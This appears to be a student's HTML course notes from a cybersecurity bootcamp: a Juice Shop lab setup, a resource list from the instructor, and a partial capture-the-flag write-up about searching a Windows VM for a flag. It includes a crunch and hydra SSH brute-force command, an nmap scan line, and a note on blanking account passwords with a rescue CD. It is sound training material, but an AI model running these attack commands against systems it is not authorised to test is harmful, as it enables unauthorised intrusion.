+      <code><code></code></code></p>
+    <pre>jeffs@jeffs-desktop:~$<kbd> sudo docker run --rm=False -p 3000:3000 bkimminich/juice-shop</kbd>
+<samp>
+&gt; juice-shop@13.3.0 start
+&gt; node build/app
+
+info: All dependencies in ./package.json are satisfied (OK)
+info: Chatbot training data botDefaultTrainingData.json validated (OK)
+info: Detected Node.js version v16.14.2 (OK)
+info: Detected OS linux (OK)
+info: Detected CPU x64 (OK)
+info: Configuration default validated (OK)
+info: Required file server.js is present (OK)
+info: Required file index.html is present (OK)
+info: Required file styles.css is present (OK)
+info: Required file main.js is present (OK)
+info: Required file tutorial.js is present (OK)
+info: Required file polyfills.js is present (OK)
+info: Required file runtime.js is present (OK)
+info: Required file vendor.js is present (OK)
+(node:18) [DEP0152] DeprecationWarning: Custom PerformanceEntry accessors are deprecated. Please use the detail property.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+info: Port 3000 is available (OK)
+info: Server listening on port 3000</samp>
+
+</pre>
+    <h3><a id="mozTocId965076" class="mozTocH3"></a>Lab Local File Inclusion</h3>
+    <p> Utilizing the JuiceShop machine you set up in the previous lab, you will
+      exploit the Local File Inclusion (LFI) and Remote File Inclusion (Remote
+      File Inclusion) on this vulnerable web application.</p>
+    <p></p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <h2><a id="mozTocId564572" class="mozTocH2"></a>Password Attack Lab</h2>
+    <p>short password on windows (victim).</p>
+    <p>crunch 0 2 -0 wordlist.txt</p>
+    <p><br>
+    </p>
+    <p>hydra -l hi -P wordlist.txt&nbsp; IPADDRESS -t 4 ssh</p>
+    <p><br>
+    </p>
+    <p>What is an OpenSSH authentication agent?&nbsp; See the <a href="https://www.ssh.com/academy/ssh/agent">ssh-agent</a>
+      in <a href="https://www.ssh.com">ssh.com</a>.&nbsp; See also the <a href="https://www.ssh.com/academy/iam/ssh-key-management">SSH
+        key management pages</a>.</p>
+    <h1><a id="mozTocId846677" class="mozTocH1"></a>May 7th</h1>
+    <h2><a id="mozTocId333186" class="mozTocH2"></a>Ben wrote some good advice</h2>
+    <div dir="ltr">
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">All,
+        </p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">It
+        is high time to get in the loop!</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">As
+you
+        can imagine, in this field, it is absolutely critical to get in the
+        real-time info loop. Shifting landscapes and paradigms in IT tend to
+        scare away and keep out the lazy. I have a sneaking suspicion this does
+        not apply to you! If that is the MO for IT, then &ldquo;normal&rdquo; in
+        cybersecurity looks more like a fiery tempest. This constant need for
+        information keeps most others away from the inner circles... Away from
+        the highly coveted cool kid&rsquo;s cafeteria table.</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">&nbsp;</p>
+      <p class="MsoNormal" style="background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; line-height: 107%; font-size: 11pt; font-family: Calibri, sans-serif;"><b><u><span
+              style="font-size: 18pt;">Podcasts</span></u></b></p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">I
+        almost never watch TV, ever. I simply do not have the time nor the
+        patience for it. So, finding time for podcasts is tricky. My daily
+        commute goes from the kitchen, through the hall, down the stairs, and to
+        my office. No podcast opportunity there. I find that I basically have no
+        time for podcasts except for when I swim at the gym or walk the dog. It
+        certainly helps pass the time, anyway. All that said, podcasts are
+        awesome, near real-time, and usually pretty high quality in our field.</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">My
+Favorite:
+        Darknet Diaries</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Honorable
+Mention:
+        Smashing Security</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Down
+the
+        Security Rabbit Hole</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Risky
+        Biz</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Hacking
+        Humans</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">&nbsp;</p>
+      <p class="MsoNormal" style="background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; line-height: 107%; font-size: 11pt; font-family: Calibri, sans-serif;"><b><u><span
+              style="font-size: 18pt;">Videos</span></u></b></p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Videos
+are
+        a terrific source of info, but keep in mind that they vary widely in
+        quality, accuracy and relevancy. You will find your favorite
+        broadcasters in short order. Start here:&nbsp;</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;"><a
+          href="https://cybersecurityventures.com/5-best-cybersecurity-videos-to-watch-in-2021/"
+          target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://cybersecurityventures.com/5-best-cybersecurity-videos-to-watch-in-2021/&amp;source=gmail&amp;ust=1652074415410000&amp;usg=AOvVaw0-SkRRiVacpDDpFEptAUlM"><span
+            style="color: rgb(5, 99, 193);">https://cybersecurityventures.<wbr>com/5-best-cybersecurity-<wbr>videos-to-watch-in-2021/</span></a></p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">&nbsp;</p>
+      <p class="MsoNormal" style="background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; line-height: 107%; font-size: 11pt; font-family: Calibri, sans-serif;"><b><u><span
+              style="font-size: 18pt;">Web</span></u></b></p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Wikipedia
+is
+        a terrific resource for the cybersecurity student. A quick caveat:
+        I&rsquo;d shy away from wikipedia&rsquo;s pages on our more
+        controversial topics like Snowden, Assange, domestic espionage, and so
+        on. These kinds of topics are in constant debate on Wikipedia. I do
+        challenge my students to have well informed opinions on controversial
+        topics even if, and especially if, we disagree. As the future resident
+        security expert, people will ask you questions about these topics. You
+        need to have well-reasoned answers for them.</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Thank
+goodness
+        that most of the cybersecurity world is not in perpetual controversy and
+        Wikipedia is perfect for that. How does the TCP handshake work? What is
+        a rainbow attack? How does a buffer overflow attack work? What is the
+        Cyber Kill Chain? Why is it called Eternal Blue? What is a virtual
+        machine? And so on. Perfect.</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">&nbsp;</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;"><b><u>People</u></b></p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">These
+are
+        some people and legends you should get to know.</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Kevin
+        Mitnick</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Bruce
+Schneier
+        (a personal favorite)</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Katie
+        Moussouris</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Kevin
+        Poulsen</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Graham
+        Cluley</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Zach
+        Whittaker</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Robert
+Tappan
+        Morris</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Larry
+        Dignan</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Eleanor
+        Dallaway</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Troy
+        Hunt</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Brian
+        Krebs</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">John
+        McAfee</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Eugene
+        Kaspersky</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Charlie
+Alfred
+        Miller</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Ginni
+        Rometty</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Dan
+        Kaminsky</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">&nbsp;</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;"><b><u>Businesses</u></b></p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;"><a
+          href="https://www.thesoftwarereport.com/the-top-25-cybersecurity-companies-of-2021/"
+          target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.thesoftwarereport.com/the-top-25-cybersecurity-companies-of-2021/&amp;source=gmail&amp;ust=1652074415410000&amp;usg=AOvVaw3ndmcgw_Md3S5dyYaYmwLy"><span
+            style="color: rgb(5, 99, 193);">https://www.thesoftwarereport.<wbr>com/the-top-25-cybersecurity-<wbr>companies-of-2021/</span></a></p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">&nbsp;</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;"><b><u>Books</u></b></p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">&ldquo;Network
+Security
+        for Dummies&rdquo; has no place on your professional bookshelf, just
+        sayin'. &ldquo;How to Hack&rdquo; or anything that sounds like that is a
+        waste of paper. It will be obsolete many times over before it even
+        leaves the publishing house. Stick with the classics.</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Dale
+        Carnegie</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Sun
+        Tzu</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">And
+so
+        on</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">&nbsp;</p>
+      <p class="MsoNormal" style="background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; line-height: 107%; font-size: 11pt; font-family: Calibri, sans-serif;"><b><u><span
+              style="font-size: 18pt;">Email</span></u></b></p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Many
+pillars
+        in the cybersecurity game offer email newsletters. Big fan. Try some of
+        these. Granted you need to register your info in order to get on their
+        lists. Might make a new gmail account just for newsletters and stuff.</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Stack
+        Overflow</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">SANS</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">OWASP</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Infosec
+        Institute</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">&nbsp;</p>
+      <p class="MsoNormal" style="background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; line-height: 107%; font-size: 11pt; font-family: Calibri, sans-serif;"><b><u><span
+              style="font-size: 18pt;">Practice</span></u></b></p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Few
+things
+        are a more adept time thief as joining an online hacking community and
+        breaking into CTFs. The challenges get harder and harder. The challenges
+        almost always have associated YouTube resources to walk you through it
+        when you get stuck. When you rank at these sites, that becomes a resume
+        bullet / interview talking point. Interviewer: &ldquo;It says here on
+        your resume that you achieved the rank of &lsquo;Hacker&rsquo; at
+        someplace called &lsquo;Try-Hack-Me.&rsquo; What is that about?&rdquo;
+        [Insert good answer here] = job landed.</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Vulnhub</p>
+      <p class="MsoNormal" style="line-height: 11.75pt; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-origin: initial; background-clip: initial; margin: 0in 0in 8pt; font-size: 11pt; font-family: Calibri, sans-serif;">Try-Hack-Me</p>
+    </div>
+    <p></p>
+    <h1><a id="mozTocId15569" class="mozTocH1"></a>May 8th<br>
+    </h1>
+    <h2><a id="mozTocId49823" class="mozTocH2"></a>Deliberately Vulnerable Web
+      Application (DVWA)</h2>
+    <h1><a id="mozTocId208141" class="mozTocH1"></a>May 9th</h1>
+    <p>How Ben would attack a machine.&nbsp; Ben doesn't believe in the kill
+      chain.</p>
+    <p>nmap is a great decoy.&nbsp; Consider dipiscan, massscan </p>
+    <p>Then spring the trap.</p>
+    <p>tails theamnesicincognitolivesystem</p>
+    <p>yandex.Browser&nbsp; - Windows, Mac, Android.</p>
+    <p>epic browser</p>
+    <p>PumpApp&nbsp; LizotMitis&nbsp; ISoft LLC</p>
+    <p><br>
+    </p>
+    <p>3 presentations: One for CEO.&nbsp; One for the CISO.&nbsp;&nbsp; One for
+      the sysadmins.</p>
+    <p><br>
+    </p>
+    <p>nmap -sS -A -T4 -oN nmap_default.txt IPADDRESS</p>
+    <p><br>
+    </p>
+    <p>-sS</p>
+    <p><br>
+    </p>
+    <p>nikto</p>
+    <h1><a id="mozTocId413685" class="mozTocH1"></a> </h1>
+    <p> hacktricks.xyz/pentesting-web/file-inclusion</p>
+    <p><br>
+    </p>
+    <p>pwnlab&nbsp; VulnHub Walkthrough - boot to root.</p>
+    <p><br>
+    </p>
+    <p>https://www.youtube.com/watch?v=Q85ku046Q_E</p>
+    <p>\</p>
+    <h1><a id="mozTocId637917" class="mozTocH1"></a>May 10<sup>th</sup><br>
+    </h1>
+    <h2><a id="mozTocId562442" class="mozTocH2"></a>Reading</h2>
+    <p><br>
+    </p>
+    <h1><a id="mozTocId754834" class="mozTocH1"></a>May 11<sup>th</sup><br>
+    </h1>
+    <h2><a id="mozTocId558842" class="mozTocH2"></a>The final exam - capture the
+      flag</h2>
+    <p>Ben gave us an enormous (23 GB!) OVA file with a windows/2008 virtual
+      machine on it.</p>
+    <h3><a id="mozTocId714308" class="mozTocH3"></a>Login normally</h3>
+    <p>First thing - did he make it easy to login normally?&nbsp; Apparently
+      not.&nbsp; However, I used the System Rescue CD to enable all accounts and
+      set the to blank passwords.&nbsp; Now, whenever I boot the VM, I get
+      logged in as Administrator2.</p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <h4><a id="mozTocId120901" class="mozTocH4"></a>A red herring!</h4>
+    <p>File contains:</p>
+    <pre>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /&gt;
+&lt;title&gt;You found something but I'm looking for a number not a picture... wwwroot? QR Code? Metadata? '&lt;/title&gt;
+&lt;style type="text/css"&gt;
+...
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;div id="container"&gt;
+		&lt;a href="<a href="https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/">https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/</a>"&gt;&lt;img src="iisstart.png" alt="IIS" width="960" height="600" /&gt;&lt;/a&gt;
+	&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+    <br>
+    <table style="width: 100%" border="1">
+      <tbody>
+        <tr>
+          <td><img src="Final/iisstart.png" alt="A red herring" title="This is not the flag you're looking for"></td>
+          <td> <img src="Final/Oops%21.png" alt="" title="Oops!  A QR Code" style="float:left;"
+              width="300"> <span style="float:right; font-family:courier;">jeffs@jeffs-desktop:~/Coding_DoJo/Final$
+              <kbd>zbarimg Oops\!.png</kbd> <samp>QR-Code:Oops! You just fell
+                for a honeypot. If this were a real honeypot, you would have
+                just been infected by a RAT, key logger, memory monitor, reverse
+                SIEM agent, and many other scary things that go bump on the net.
+                When pen testing in the real world, try really hard NOT to fall
+                for this kind thing</samp>. scanned 1 barcode symbols from 1
+              images in 0.68 seconds </span>
+            <p>Clever, Ben, very clever.</p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <br>
+    <br>
+    <p></p>
+    <br>
+    <p><br>
+    </p>
+    <h3><a id="mozTocId764524" class="mozTocH3"></a>Break in using the System
+      Rescue CD version </h3>
+    <p>I went to the <a href="https://www.system-rescue.org/">System Rescue CD
+        site</a> and got version 9.02.&nbsp; The SHA256SUM is </p>
+    <pre>ffd0864f513007243e97c38cedd64fdd604afc6032a02c3bb1eb59e9634d669a<br>ffd0864f513007243e97c38cedd64fdd604afc6032a02c3bb1eb59e9634d669a</pre>
+    <p>Now I have a flakey keyboard. <br>
+      Go in using SSH and that won't flake.&nbsp; I suspect that there is a
+      weird interaction between the hypervisor and the guest, because the
+      keyboard is flaky only when using the system rescue CD.</p>
+    <p><br>
+    </p>
+    <h4><a id="mozTocId14740" class="mozTocH4"></a>Narrative and notes</h4>
+    <p>There are 393994 files in the VM.</p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p>Look at: <span style="font-family: monospace;">./Users/Admin/AppData/Roaming/Microsoft/Windows/Recent/Yes!
+        You found it!.lnk</span> and&nbsp; <br>
+      0001120 C&nbsp;&nbsp; :&nbsp;&nbsp; \&nbsp;&nbsp; U&nbsp;&nbsp;
+      s&nbsp;&nbsp; e&nbsp;&nbsp; r&nbsp;&nbsp; s&nbsp;&nbsp; \&nbsp;&nbsp;
+      A&nbsp;&nbsp; d&nbsp;&nbsp; m&nbsp;&nbsp; i&nbsp;&nbsp; n<br>
+      0001140&nbsp;&nbsp; \&nbsp;&nbsp; D&nbsp;&nbsp; o&nbsp;&nbsp;
+      c&nbsp;&nbsp; u&nbsp;&nbsp; m&nbsp;&nbsp; e&nbsp;&nbsp; n&nbsp;&nbsp;
+      t&nbsp;&nbsp; s&nbsp;&nbsp; \&nbsp;&nbsp; Y&nbsp;&nbsp; e&nbsp;&nbsp;
+      a&nbsp;&nbsp; h&nbsp;&nbsp; !<br>
+      0001160&nbsp;&nbsp; .&nbsp;&nbsp; t&nbsp;&nbsp; x&nbsp;&nbsp;
+      t&nbsp;&nbsp;</p>
+    <p><span style="font-family: monospace;">C:\Users\Admin\Documents\Yeah!.txt</span></p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p>Did Ben also use a base64 encoder for the system flag file?&nbsp; Look
+      for a file that is not more than 4 lines long, and has a line that ends
+      with ==.&nbsp; Except that's not base 64.</p>
+    <p>Did Ben put that URL in the text file in clear?&nbsp; No.</p>
+    <p><br>
+    </p>
+    <p><b>Know your enemy</b>.&nbsp; Ben said that he was still working on this
+      problem on Tuesday.&nbsp; That means that, unless he modified the system
+      time or changed the timestamps on the files, any file wih a modification
+      date later than Tuesday is suspect.&nbsp; So try: <kbd>find .. -mtime -5 -ls</kbd></p>
+    <pre> 502  13/05/22 03:13:29 egrep -v "\.dll|\.exe" new_files.txt | wc -l
+  503  13/05/22 03:14:07 egrep -v "\.dll|\.exe" new_files.txt &gt; new_files_not_DLLs_or_EXEs,txt
+  504  13/05/22 03:14:31 mv new_files_not_DLLs_or_EXEs,txt new_files_not_DLLs_or_EXEs.txt
+  505  13/05/22 03:14:43 less new_files_not_DLLs_or_EXEs.txt
+  506  13/05/22 03:17:15 fgrep -v "Avast" new_files_not_DLLs_or_EXEs.txt | wc -l
+  507  13/05/22 03:17:54 fgrep -v "Avast" new_files_not_DLLs_or_EXEs.txt &gt; new_files_not_DLLs_or_EXEs_not_Avast.txt
+  508  13/05/22 03:18:42 egrep -v ".png$" new_files_not_DLLs_or_EXEs_not_Avast.txt | fgrep .png
+  509  13/05/22 03:18:56 egrep -v ".png" new_files_not_DLLs_or_EXEs_not_Avast.txt | fgrep .png
+  510  13/05/22 03:19:14 egrep -v ".png^" new_files_not_DLLs_or_EXEs_not_Avast.txt | fgrep .png
+  511  13/05/22 03:19:55 egrep -v ".png$" new_files_not_DLLs_or_EXEs_not_Avast.txt &gt; new_files_not_DLLs_or_EXEs_not_Avast_not_PNGS.txt
+  512  13/05/22 03:20:25 wc -l new_files*
+  513  13/05/22 03:20:58 egrep -i -v ".png$" new_files_not_DLLs_or_EXEs_not_Avast.txt &gt; new_files_not_DLLs_or_EXEs_not_Avast_not_PNGS.txt
+  514  13/05/22 03:21:01 wc -l new_files*
+  515  13/05/22 03:21:38 fgrep -i ".png" new_files.txt
+  516  13/05/22 03:21:45 fgrep -i ".png" new_files.txt | wc -l
+  517  13/05/22 03:34:54 history 20
+jeffs@jeffs-desktop:~/Coding_DoJo/Final$ <br>jeffs@jeffs-desktop:~/Coding_DoJo/Final$ fgrep -v "0 May "  new_files_not_DLLs_or_EXEs_not_Avast_not_PNGS.txt &gt; new_files_not_DLLs_or_EXEs_not_Avast_not_PNGS_not_empty.txt
+jeffs@jeffs-desktop:~/Coding_DoJo/Final$ fgrep  "0 May "  new_files_not_DLLs_or_EXEs_not_Avast_not_PNGS.txt | wc -l
+27609
+jeffs@jeffs-desktop:~/Coding_DoJo/Final$ <br>jeffs@jeffs-desktop:~/Coding_DoJo/Final$ <kbd>wc -l new_files* | sort -n</kbd>
+<samp>   12905 new_files_not_DLLs_or_EXEs_not_Avast_not_PNGS_not_empty.txt
+   40514 new_files_not_DLLs_or_EXEs_not_Avast_not_PNGS.txt
+   40698 new_files_not_DLLs_or_EXEs_not_Avast.txt
+   41793 new_files_not_DLLs_or_EXEs.txt
+   54413 new_files.txt
+  190323 total</samp>
+jeffs@jeffs-desktop:~/Coding_DoJo/Final$ 
+</pre>
+    <p> Friday morning, Ben gave us another clue: </p>
